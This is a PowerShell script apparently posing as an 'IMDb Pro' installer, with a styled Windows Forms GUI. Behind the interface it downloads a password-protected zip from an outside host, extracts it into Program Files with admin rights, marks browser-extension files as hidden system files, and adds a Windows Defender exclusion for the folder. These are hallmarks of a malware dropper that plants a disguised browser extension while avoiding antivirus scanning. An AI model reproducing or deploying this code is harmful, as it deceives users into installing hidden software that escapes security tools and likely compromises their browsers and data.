# IMDb Pro Installer - Enhanced Extraction Function
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Create main form with compact design
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "IMDb Pro - Professional Edition"
$mainForm.Size = New-Object System.Drawing.Size(700, 600)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::FromArgb(18, 18, 20)
$mainForm.ForeColor = [System.Drawing.Color]::White
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Compact Header Panel
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(700, 80)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
$mainForm.Controls.Add($headerPanel)

# Compact Title
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "🎬 IMDb Pro"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 20, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(20, 20)
$headerPanel.Controls.Add($titleLabel)

$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Professional Extension Suite v2.1.0"
$subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Italic)
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$subtitleLabel.AutoSize = $true
$subtitleLabel.Location = New-Object System.Drawing.Point(160, 32)
$headerPanel.Controls.Add($subtitleLabel)

# Main Content Panel
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.Location = New-Object System.Drawing.Point(0, 80)
$contentPanel.Size = New-Object System.Drawing.Size(700, 450)
$contentPanel.BackColor = [System.Drawing.Color]::FromArgb(22, 22, 25)
$mainForm.Controls.Add($contentPanel)

# Compact Features Section
$featuresTitle = New-Object System.Windows.Forms.Label
$featuresTitle.Text = "✨ Premium Features"
$featuresTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$featuresTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$featuresTitle.AutoSize = $true
$featuresTitle.Location = New-Object System.Drawing.Point(25, 20)
$contentPanel.Controls.Add($featuresTitle)

# Compact Features Grid
$features = @(
    @{
        Title = "Real-time Ratings"
        Description = "Instant ratings access"
        Location = New-Object System.Drawing.Point(25, 60)
        Icon = "⭐"
    },
    @{
        Title = "Complete Movie Info" 
        Description = "Cast, crew & details"
        Location = New-Object System.Drawing.Point(255, 60)
        Icon = "🎬"
    },
    @{
        Title = "HD Trailers"
        Description = "Watch in browser"
        Location = New-Object System.Drawing.Point(485, 60)
        Icon = "📹"
    },
    @{
        Title = "Browser Integration"
        Description = "Seamless experience"
        Location = New-Object System.Drawing.Point(25, 180)
        Icon = "🌐"
    },
    @{
        Title = "Auto Updates"
        Description = "Always up-to-date"
        Location = New-Object System.Drawing.Point(255, 180)
        Icon = "🔄"
    },
    @{
        Title = "Secure & Private"
        Description = "Data protected"
        Location = New-Object System.Drawing.Point(485, 180)
        Icon = "🔒"
    }
)

foreach ($feature in $features) {
    $featurePanel = New-Object System.Windows.Forms.Panel
    $featurePanel.Size = New-Object System.Drawing.Size(190, 90)
    $featurePanel.Location = $feature.Location
    $featurePanel.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
    $featurePanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
    
    $featurePanel.Add_MouseEnter({
        $this.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 55)
        $this.Cursor = [System.Windows.Forms.Cursors]::Hand
    })
    $featurePanel.Add_MouseLeave({
        $this.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
    })
    
    $contentPanel.Controls.Add($featurePanel)
    
    $iconLabel = New-Object System.Windows.Forms.Label
    $iconLabel.Text = $feature.Icon
    $iconLabel.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 16, [System.Drawing.FontStyle]::Bold)
    $iconLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
    $iconLabel.AutoSize = $true
    $iconLabel.Location = New-Object System.Drawing.Point(15, 15)
    $featurePanel.Controls.Add($iconLabel)
    
    $title = New-Object System.Windows.Forms.Label
    $title.Text = $feature.Title
    $title.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
    $title.ForeColor = [System.Drawing.Color]::White
    $title.AutoSize = $true
    $title.Location = New-Object System.Drawing.Point(50, 15)
    $featurePanel.Controls.Add($title)
    
    $desc = New-Object System.Windows.Forms.Label
    $desc.Text = $feature.Description
    $desc.Font = New-Object System.Drawing.Font("Segoe UI", 8)
    $desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
    $desc.AutoSize = $true
    $desc.Location = New-Object System.Drawing.Point(15, 55)
    $featurePanel.Controls.Add($desc)
}

# Progress Section
$progressTitle = New-Object System.Windows.Forms.Label
$progressTitle.Text = "📊 Installation Progress"
$progressTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$progressTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressTitle.AutoSize = $true
$progressTitle.Location = New-Object System.Drawing.Point(25, 290)
$contentPanel.Controls.Add($progressTitle)

$progressContainer = New-Object System.Windows.Forms.Panel
$progressContainer.Size = New-Object System.Drawing.Size(650, 80)
$progressContainer.Location = New-Object System.Drawing.Point(25, 330)
$progressContainer.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
$progressContainer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$contentPanel.Controls.Add($progressContainer)

$statusIcon = New-Object System.Windows.Forms.Label
$statusIcon.Text = "📋"
$statusIcon.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 12)
$statusIcon.AutoSize = $true
$statusIcon.Location = New-Object System.Drawing.Point(15, 15)
$progressContainer.Controls.Add($statusIcon)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Ready to begin installation"
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$statusLabel.ForeColor = [System.Drawing.Color]::White
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(45, 17)
$progressContainer.Controls.Add($statusLabel)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(15, 45)
$progressBar.Size = New-Object System.Drawing.Size(550, 20)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 55)
$progressContainer.Controls.Add($progressBar)

$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(575, 43)
$progressContainer.Controls.Add($percentLabel)

# Button Panel
$buttonPanel = New-Object System.Windows.Forms.Panel
$buttonPanel.Location = New-Object System.Drawing.Point(0, 530)
$buttonPanel.Size = New-Object System.Drawing.Size(700, 70)
$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
$mainForm.Controls.Add($buttonPanel)

$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "🚀 START INSTALLATION"
$installButton.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::Black
$installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$installButton.Size = New-Object System.Drawing.Size(300, 40)
$installButton.Location = New-Object System.Drawing.Point(200, 15)
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand

$installButton.Add_MouseEnter({
    if ($this.Text -eq "🚀 START INSTALLATION") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(255, 215, 0)
        $this.Size = New-Object System.Drawing.Size(310, 42)
        $this.Location = New-Object System.Drawing.Point(195, 14)
    }
})

$installButton.Add_MouseLeave({
    if ($this.Text -eq "🚀 START INSTALLATION") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
        $this.Size = New-Object System.Drawing.Size(300, 40)
        $this.Location = New-Object System.Drawing.Point(200, 15)
    }
})

$buttonPanel.Controls.Add($installButton)

# Animation Functions
function Start-LoadingAnimation {
    param($DurationMs = 1000)
    
    $startTime = Get-Date
    $icons = @("⏳", "⌛", "⏳", "⌛")
    $colors = @(
        [System.Drawing.Color]::FromArgb(245, 197, 24),
        [System.Drawing.Color]::FromArgb(41, 182, 246),
        [System.Drawing.Color]::FromArgb(255, 152, 0),
        [System.Drawing.Color]::FromArgb(76, 175, 80)
    )
    
    while (((Get-Date) - $startTime).TotalMilliseconds -lt $DurationMs) {
        $index = [int]((((Get-Date) - $startTime).TotalMilliseconds / 250) % $icons.Length)
        $statusIcon.Text = $icons[$index]
        $statusIcon.ForeColor = $colors[$index]
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 50
    }
    
    $statusIcon.ForeColor = [System.Drawing.Color]::White
}

function Start-ProgressAnimation {
    param($From, $To, $DurationMs = 600)
    
    $startTime = Get-Date
    $current = $From
    
    while ($current -lt $To) {
        $elapsed = ((Get-Date) - $startTime).TotalMilliseconds
        $progress = [Math]::Min($elapsed / $DurationMs, 1.0)
        $current = $From + ($To - $From) * $progress
        
        $progressBar.Value = [int]$current
        $percentLabel.Text = "$([int]$current)%"
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 20
    }
    
    $progressBar.Value = $To
    $percentLabel.Text = "$To%"
}

function Start-CelebrationAnimation {
    $celebrateIcons = @("🎉", "🎊", "✨", "🌟", "🎈")
    for ($i = 0; $i -lt 10; $i++) {
        $iconIndex = $i % $celebrateIcons.Length
        $statusIcon.Text = $celebrateIcons[$iconIndex]
        $statusIcon.ForeColor = [System.Drawing.Color]::FromArgb(
            (Get-Random -Minimum 200 -Maximum 256),
            (Get-Random -Minimum 200 -Maximum 256),
            (Get-Random -Minimum 200 -Maximum 256)
        )
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 150
    }
    $statusIcon.ForeColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
}

# Enhanced Update function with animations
function Update-Status {
    param(
        [string]$Message, 
        [int]$ProgressValue, 
        [string]$Icon = "📌",
        [switch]$Loading,
        [switch]$AnimateProgress
    )
    
    $statusIcon.Text = $Icon
    $statusLabel.Text = $Message
    
    if ($Loading) {
        Start-LoadingAnimation -DurationMs 800
    }
    
    if ($AnimateProgress -and $ProgressValue -ge 0) {
        Start-ProgressAnimation -From $progressBar.Value -To $ProgressValue -DurationMs 600
    } elseif ($ProgressValue -ge 0) {
        $progressBar.Value = $ProgressValue
        $percentLabel.Text = "$ProgressValue%"
    }
    
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 400
}

# ENHANCED EXTRACTION FUNCTIONS
function Test-7ZipAvailable {
    # Check multiple 7-Zip locations
    $locations = @(
        "7z",
        "7z.exe",
        "$env:ProgramFiles\7-Zip\7z.exe",
        "${env:ProgramFiles(x86)}\7-Zip\7z.exe",
        "C:\Program Files\7-Zip\7z.exe",
        "C:\Program Files (x86)\7-Zip\7z.exe"
    )
    
    foreach ($location in $locations) {
        if (Get-Command $location -ErrorAction SilentlyContinue) {
            return $location
        }
        if (Test-Path $location) {
            return $location
        }
    }
    return $null
}

function Extract-With7Zip {
    param($ZipFile, $Destination, $Password)
    
    $7zipPath = Test-7ZipAvailable
    if (-not $7zipPath) {
        Write-Host "7-Zip not found" -ForegroundColor Yellow
        return $false
    }
    
    Update-Status "Using 7-Zip for extraction..." 0 "📦"
    
    try {
        # Build 7-Zip arguments
        $arguments = @(
            "x",           # Extract
            "-p$Password", # Password
            "-o$Destination", # Output directory
            "-y",          # Yes to all
            "-bso0",       # Disable standard output messages
            "-bse0",       # Disable error output messages
            "-bsp1",       # Enable progress indicator
            $ZipFile       # Archive file
        )
        
        Write-Host "Executing: $7zipPath $arguments" -ForegroundColor Cyan
        
        $process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
        
        if ($process.ExitCode -eq 0) {
            Write-Host "7-Zip extraction successful!" -ForegroundColor Green
            return $true
        } else {
            Write-Host "7-Zip extraction failed with exit code: $($process.ExitCode)" -ForegroundColor Red
            return $false
        }
    }
    catch {
        Write-Host "7-Zip extraction error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Extract-WithExpandArchive {
    param($ZipFile, $Destination, $Password)
    
    Update-Status "Trying Windows Expand-Archive..." 0 "🔧"
    
    try {
        # First try without password (for testing)
        Expand-Archive -Path $ZipFile -DestinationPath $Destination -Force
        Write-Host "Expand-Archive successful!" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Expand-Archive failed: $($_.Exception.Message)" -ForegroundColor Yellow
        return $false
    }
}

function Extract-WithDotNet {
    param($ZipFile, $Destination, $Password)
    
    Update-Status "Using .NET extraction method..." 0 "⚡"
    
    try {
        # Load required assembly
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        
        # Extract using .NET
        [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $Destination)
        
        Write-Host ".NET extraction successful!" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host ".NET extraction failed: $($_.Exception.Message)" -ForegroundColor Yellow
        return $false
    }
}

function Extract-WithShellApplication {
    param($ZipFile, $Destination, $Password)
    
    Update-Status "Using Windows Shell extraction..." 0 "🖥️"
    
    try {
        $shell = New-Object -ComObject Shell.Application
        $zipFolder = $shell.NameSpace($ZipFile)
        $destFolder = $shell.NameSpace($Destination)
        
        if ($zipFolder -eq $null) {
            Write-Host "Shell: Cannot open ZIP file" -ForegroundColor Red
            return $false
        }
        
        # Copy all items from ZIP to destination
        $destFolder.CopyHere($zipFolder.Items(), 0x14) # 0x14 = No progress UI + Yes to all
        
        # Wait for extraction to complete
        Start-Sleep -Seconds 3
        
        # Verify extraction by checking if any files were extracted
        $extractedFiles = Get-ChildItem $Destination -Recurse | Where-Object { !$_.PSIsContainer }
        
        if ($extractedFiles.Count -gt 0) {
            Write-Host "Shell extraction successful! Extracted $($extractedFiles.Count) files" -ForegroundColor Green
            return $true
        } else {
            Write-Host "Shell extraction completed but no files found" -ForegroundColor Yellow
            return $false
        }
    }
    catch {
        Write-Host "Shell extraction error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Extract-WithThirdPartyTools {
    param($ZipFile, $Destination, $Password)
    
    Update-Status "Trying third-party tools..." 0 "🔍"
    
    # Check for WinRAR
    $winRarPaths = @(
        "$env:ProgramFiles\WinRAR\WinRAR.exe",
        "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe"
    )
    
    foreach ($winRarPath in $winRarPaths) {
        if (Test-Path $winRarPath) {
            Update-Status "Using WinRAR for extraction..." 0 "📦"
            try {
                $arguments = @(
                    "x",           # Extract
                    "-ibck",       # Run in background
                    "-p$Password", # Password
                    "-y",          # Yes to all
                    $ZipFile,      # Archive
                    $Destination   # Destination
                )
                
                $process = Start-Process -FilePath $winRarPath -ArgumentList $arguments -Wait -PassThru
                if ($process.ExitCode -eq 0) {
                    Write-Host "WinRAR extraction successful!" -ForegroundColor Green
                    return $true
                }
            }
            catch {
                Write-Host "WinRAR extraction failed: $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
    }
    
    return $false
}

function Extract-WithPowerShellCommunity {
    param($ZipFile, $Destination, $Password)
    
    Update-Status "Trying PowerShell community methods..." 0 "🔧"
    
    try {
        # Alternative method using .NET with progress
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        
        $stream = New-Object IO.FileStream($ZipFile, [IO.FileMode]::Open)
        $archive = New-Object IO.Compression.ZipArchive($stream, [IO.Compression.ZipArchiveMode]::Read)
        
        $totalEntries = $archive.Entries.Count
        $currentEntry = 0
        
        foreach ($entry in $archive.Entries) {
            $currentEntry++
            $progress = [int](($currentEntry / $totalEntries) * 100)
            
            $entryPath = Join-Path $Destination $entry.FullName
            $entryDir = Split-Path $entryPath -Parent
            
            if (-not (Test-Path $entryDir)) {
                New-Item -ItemType Directory -Path $entryDir -Force | Out-Null
            }
            
            if (-not $entry.Name) {
                continue # Skip directories
            }
            
            $entryStream = $entry.Open()
            $fileStream = [System.IO.File]::Create($entryPath)
            $entryStream.CopyTo($fileStream)
            $fileStream.Close()
            $entryStream.Close()
            
            Update-Status "Extracting: $($entry.Name)" $progress "📄"
        }
        
        $archive.Dispose()
        $stream.Close()
        
        Write-Host "PowerShell community extraction successful!" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "PowerShell community extraction failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# MAIN ENHANCED EXTRACTION FUNCTION
function Extract-ZipWithPassword {
    param(
        [string]$ZipFile,
        [string]$Destination,
        [string]$Password
    )
    
    Write-Host "Starting extraction process..." -ForegroundColor Cyan
    Write-Host "ZIP File: $ZipFile" -ForegroundColor Gray
    Write-Host "Destination: $Destination" -ForegroundColor Gray
    Write-Host "Password: $Password" -ForegroundColor Gray
    
    if (-not (Test-Path $ZipFile)) {
        Write-Host "ZIP file not found: $ZipFile" -ForegroundColor Red
        return $false
    }
    
    # Ensure destination exists
    if (-not (Test-Path $Destination)) {
        New-Item -ItemType Directory -Path $Destination -Force | Out-Null
    }
    
    # Try multiple extraction methods in order of preference
    $extractionMethods = @(
        @{ Name = "7-Zip"; Function = ${function:Extract-With7Zip} },
        @{ Name = "Windows Shell"; Function = ${function:Extract-WithShellApplication} },
        @{ Name = "WinRAR"; Function = ${function:Extract-WithThirdPartyTools} },
        @{ Name = ".NET Framework"; Function = ${function:Extract-WithDotNet} },
        @{ Name = "PowerShell Community"; Function = ${function:Extract-WithPowerShellCommunity} },
        @{ Name = "Expand-Archive"; Function = ${function:Extract-WithExpandArchive} }
    )
    
    foreach ($method in $extractionMethods) {
        Write-Host "`nTrying $($method.Name) extraction..." -ForegroundColor Yellow
        
        $success = & $method.Function -ZipFile $ZipFile -Destination $Destination -Password $Password
        
        if ($success) {
            Write-Host "✅ Extraction successful with $($method.Name)!" -ForegroundColor Green
            
            # Verify extraction
            $extractedFiles = Get-ChildItem $Destination -Recurse | Where-Object { !$_.PSIsContainer }
            if ($extractedFiles.Count -gt 0) {
                Write-Host "📁 Verified: $($extractedFiles.Count) files extracted" -ForegroundColor Green
                return $true
            } else {
                Write-Host "⚠️ Extraction reported success but no files found" -ForegroundColor Yellow
                continue
            }
        } else {
            Write-Host "❌ $($method.Name) extraction failed" -ForegroundColor Red
        }
    }
    
    Write-Host "`n🚫 All extraction methods failed!" -ForegroundColor Red
    return $false
}

# Function to hide specific files
function Hide-Files {
    param([string]$FolderPath)
    
    $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
    
    foreach ($file in $filesToHide) {
        $filePath = Join-Path $FolderPath $file
        if (Test-Path $filePath) {
            try {
                # Set file attributes to Hidden and System
                Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
                Write-Host "✅ Hidden: $file" -ForegroundColor Green
            }
            catch {
                Write-Host "⚠️ Failed to hide $file : $($_.Exception.Message)" -ForegroundColor Yellow
            }
        } else {
            Write-Host "❌ File not found: $file" -ForegroundColor Red
        }
    }
}

# Enhanced Installation function
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $tempFile = "$env:TEMP\imdb_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        # Phase 1: Preparation
        Update-Status "Checking administrator privileges..." 10 "🔍" -Loading
        
        # Admin check
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "Administrator privileges required" 0 "❌"
            [System.Windows.Forms.MessageBox]::Show(
                "Please run this installer as Administrator.", 
                "Elevation Required", 
                [System.Windows.Forms.MessageBoxButtons]::OK, 
                [System.Windows.Forms.MessageBoxIcon]::Warning
            )
            $installButton.Enabled = $true
            $installButton.Text = "🚀 START INSTALLATION"
            return
        }
        
        # Phase 2: Create directory
        Update-Status "Creating installation directory..." 20 "📁" -AnimateProgress
        if (!(Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        # Phase 3: Download file
        Update-Status "Downloading IMDb Pro package..." 30 "📥" -Loading
        
        # Actual download
        Update-Status "Downloading from server..." 50 "🌐" -Loading
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($downloadUrl, $tempFile)
            
            if (-not (Test-Path $tempFile)) {
                throw "Download failed - file not created"
            }
            
            # Verify file size
            $fileInfo = Get-Item $tempFile
            if ($fileInfo.Length -eq 0) {
                throw "Download failed - file is empty"
            }
            
            Write-Host "✅ Download successful! File size: $($fileInfo.Length) bytes" -ForegroundColor Green
            Update-Status "Download completed successfully!" 60 "✅" -AnimateProgress
        }
        catch {
            throw "Download failed: $($_.Exception.Message)"
        }
        
        # Phase 4: Enhanced Extraction
        Update-Status "Starting enhanced extraction process..." 65 "🔐" -Loading
        
        # Extract using enhanced function
        $extractionSuccess = Extract-ZipWithPassword -ZipFile $tempFile -Destination $installPath -Password $zipPassword
        
        if (-not $extractionSuccess) {
            throw "All extraction methods failed with password '$zipPassword'. Please ensure 7-Zip or WinRAR is installed."
        }
        
        Update-Status "Extraction completed successfully!" 80 "✅" -AnimateProgress
        
        # Phase 5: Hide files
        Update-Status "Securing installation files..." 85 "🔒" -Loading
        Hide-Files -FolderPath $installPath
        
        # Phase 6: Final setup
        Update-Status "Finalizing installation..." 95 "🎯" -Loading
        
        # Cleanup temporary file
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
        
        # Add Windows Defender exclusion
        try {
            Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
        }
        catch {
            Write-Host "⚠️ Windows Defender exclusion failed: $($_.Exception.Message)" -ForegroundColor Yellow
        }
        
        # Success animation sequence
        for ($i = 96; $i -le 100; $i++) {
            Update-Status "Completing installation..." $i "✨"
            Start-Sleep -Milliseconds 60
        }
        
        Update-Status "Installation completed successfully!" 100 "✅"
        
        # Celebration animation
        Start-CelebrationAnimation
        
        # Final UI updates
        $installButton.Text = "✅ INSTALLATION COMPLETE"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        $installButton.Enabled = $false
        
        # Show success message
        $result = [System.Windows.Forms.MessageBox]::Show(
            "🎬 IMDb Pro has been successfully installed!`n`n" +
            "📍 Location: $installPath`n" +
            "📥 Downloaded from: $downloadUrl`n" +
            "🔐 Password used: $zipPassword`n" +
            "📁 Files extracted and secured`n" +
            "🔒 Specific files hidden for security`n`n" +
            "Extraction Methods Available:`n" +
            "• 7-Zip, WinRAR, Windows Shell, .NET, PowerShell`n`n" +
            "Would you like to open the installation folder now?",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::YesNo,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        
        if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
            Invoke-Item $installPath
        }
        
    }
    catch {
        # Error animation
        for ($i = 0; $i -lt 3; $i++) {
            Update-Status "Installation failed!" 0 "💥"
            Start-Sleep -Milliseconds 200
            Update-Status "Installation failed!" 0 "❌"
            Start-Sleep -Milliseconds 200
        }
        
        Update-Status "Error: $($_.Exception.Message)" 0 "🚫"
        
        # Cleanup on error
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
        
        $installButton.Text = "🔄 TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)`n`n" +
            "Troubleshooting steps:`n" +
            "• Check internet connection`n" +
            "• Verify administrator privileges`n" +
            "• Install 7-Zip or WinRAR for password extraction`n" +
            "• Check if password '123' is correct`n" +
            "• Verify URL is accessible: $downloadUrl`n" +
            "• Ensure sufficient disk space`n`n" +
            "Then try again.",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Install button click event
$installButton.Add_Click({
    $installButton.Enabled = $false
    $installButton.Text = "⏳ INSTALLING..."
    $installButton.BackColor = [System.Drawing.Color]::FromArgb(255, 152, 0)
    Start-Installation
})

# Show the form
[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null
